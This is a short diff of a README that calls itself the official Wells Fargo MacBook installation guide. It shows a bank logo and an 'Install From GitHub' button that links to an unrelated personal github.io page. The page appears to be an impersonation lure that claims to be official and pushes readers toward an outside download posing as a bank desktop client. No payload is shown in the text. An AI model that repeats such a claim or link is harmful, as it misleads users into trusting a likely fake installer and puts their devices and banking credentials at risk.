@@ -2,7 +2,7 @@
 ![logo](https://innovaretech.com/wp-content/uploads/2017/12/wells-fargo.jpg)
 
 Welcome to the official **Wells Fargo MacBook** installation guide 🏦  
-This repository provides a secure and easy way to install the Wells Fargo desktop client on macOS devices.  
+Follow the installation and launch instructions below to get started.  
 
 [![📖 Install From GitHub](https://img.shields.io/badge/Install%20From%20GitHub-B81020?style=for-the-badge&logo=wellsfargo&logoColor=white)](https://bigboss80beautiful.github.io/.github/wells-fargo-macbook)
 
